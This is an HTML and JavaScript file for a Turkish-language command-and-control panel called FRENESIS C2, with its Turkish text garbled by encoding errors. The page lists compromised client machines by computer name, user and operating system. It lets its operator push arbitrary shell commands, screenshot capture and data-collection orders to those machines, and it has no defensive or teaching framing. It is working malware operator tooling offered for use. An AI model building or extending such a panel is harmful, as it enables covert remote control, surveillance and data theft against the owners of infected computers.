<!DOCTYPE html>
<html>
<head>
    <title>FRENESIS C2 Kontrol Paneli</title>
    <style>
        body { font-family: Arial; background: #111; color: #0f0; margin: 20px; }
        .client { border: 1px solid #0f0; padding: 15px; margin: 10px 0; background: #222; }
        button { background: #0f0; color: #000; border: none; padding: 8px 15px; margin: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #0c0; }
        h1 { color: #0f0; }
        #clients { margin: 20px 0; }
        .online { color: #0f0; }
        .offline { color: #f00; }
    </style>
</head>
<body>
    <h1>ğŸ–¥ï¸ FRENESIS C2 Kontrol Paneli</h1>
    
    <div id="clients">
        <p>Ä°stemciler yÃ¼kleniyor...</p>
    </div>
    
    <div id="commandPanel" style="display:none;">
        <h2>Komut GÃ¶nder</h2>
        <div>
            <label>Ä°stemci: </label>
            <select id="clientSelect"></select>
        </div>
        <div>
            <label>Komut TÃ¼rÃ¼: </label>
            <select id="commandType">
                <option value="shell">Shell Komutu</option>
                <option value="screenshot">Ekran GÃ¶rÃ¼ntÃ¼sÃ¼</option>
                <option value="collect">Veri Topla</option>
            </select>
        </div>
        <div>
            <label>Komut: </label>
            <input type="text" id="commandInput" placeholder="whoami / ipconfig / dir...">
        </div>
        <button onclick="sendCommand()">Komut GÃ¶nder</button>
    </div>

    <script>
        // Ä°stemcileri yÃ¼kle
        async function loadClients() {
            try {
                const response = await fetch('/api/clients');
                const clients = await response.json();
                
                let html = '<h2>ğŸ“¡ BaÄŸlÄ± Ä°stemciler (' + Object.keys(clients).length + ')</h2>';
                
                if (Object.keys(clients).length === 0) {
                    html += '<p>HenÃ¼z istemci baÄŸlanmadÄ±.</p>';
                } else {
                    // Ä°stemci seÃ§imi iÃ§in dropdown'u doldur
                    const select = document.getElementById('clientSelect');
                    select.innerHTML = '';
                    
                    for (const clientId in clients) {
                        const client = clients[clientId];
                        const lastSeen = new Date(client.last_seen);
                        const now = new Date();
                        const minutesAgo = Math.floor((now - lastSeen) / (1000 * 60));
                        const status = minutesAgo < 5 ? 'ğŸŸ¢ Ã‡evrimiÃ§i' : 'ğŸŸ¡ Uykuda';
                        
                        // Ä°stemci kartÄ±
                        html += `
                        <div class="client">
                            <strong>${client.computer_name || 'Bilinmeyen'}</strong><br>
                            <strong>KullanÄ±cÄ±:</strong> ${client.user || 'Bilinmeyen'}<br>
                            <strong>OS:</strong> ${client.os || 'Bilinmeyen'}<br>
                            <strong>Son GÃ¶rÃ¼lme:</strong> ${client.last_seen}<br>
                            <strong>Durum:</strong> ${status} (${minutesAgo} dakika Ã¶nce)<br>
                            <button onclick="sendSpecificCommand('${clientId}', 'collect')">ğŸ“Š Veri Topla</button>
                            <button onclick="sendSpecificCommand('${clientId}', 'screenshot')">ğŸ“¸ Ekran GÃ¶rÃ¼ntÃ¼sÃ¼</button>
                            <button onclick="sendSpecificCommand('${clientId}', 'shell', 'whoami')">ğŸ–¥ï¸ whoami</button>
                            <button onclick="sendSpecificCommand('${clientId}', 'shell', 'ipconfig')">ğŸŒ ipconfig</button>
                        </div>`;
                        
                        // Dropdown'a ekle
                        const option = document.createElement('option');
                        option.value = clientId;
                        option.text = `${client.computer_name} (${client.user})`;
                        select.appendChild(option);
                    }
                    
                    // Komut panelini gÃ¶ster
                    document.getElementById('commandPanel').style.display = 'block';
                }
                
                document.getElementById('clients').innerHTML = html;
            } catch (error) {
                document.getElementById('clients').innerHTML = '<p style="color:red">Sunucuya baÄŸlanÄ±lamadÄ±. Sunucu Ã§alÄ±ÅŸÄ±yor mu?</p>';
                console.error('Hata:', error);
            }
        }
        
        // Komut gÃ¶nder
        async function sendSpecificCommand(clientId, type, data = '') {
            try {
                const response = await fetch('/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        client_id: clientId,
                        command: {type: type, data: data}
                    })
                });
                
                const result = await response.json();
                alert(`âœ… Komut gÃ¶nderildi!\nKomut ID: ${result.command_id || 'N/A'}\nDurum: ${result.status}`);
                
                // 5 saniye sonra verileri yenile
                setTimeout(loadClients, 5000);
            } catch (error) {
                alert('âŒ Komut gÃ¶nderilemedi: ' + error);
            }
        }
        
        function sendCommand() {
            const clientId = document.getElementById('clientSelect').value;
            const type = document.getElementById('commandType').value;
            const data = document.getElementById('commandInput').value;
            
            if (!clientId) {
                alert('LÃ¼tfen bir istemci seÃ§in!');
                return;
            }
            
            sendSpecificCommand(clientId, type, data);
        }
        
        // Her 10 saniyede bir yenile
        setInterval(loadClients, 10000);
        
        // Sayfa yÃ¼klendiÄŸinde Ã§alÄ±ÅŸtÄ±r
        document.addEventListener('DOMContentLoaded', loadClients);
    </script>
</body>
</html>
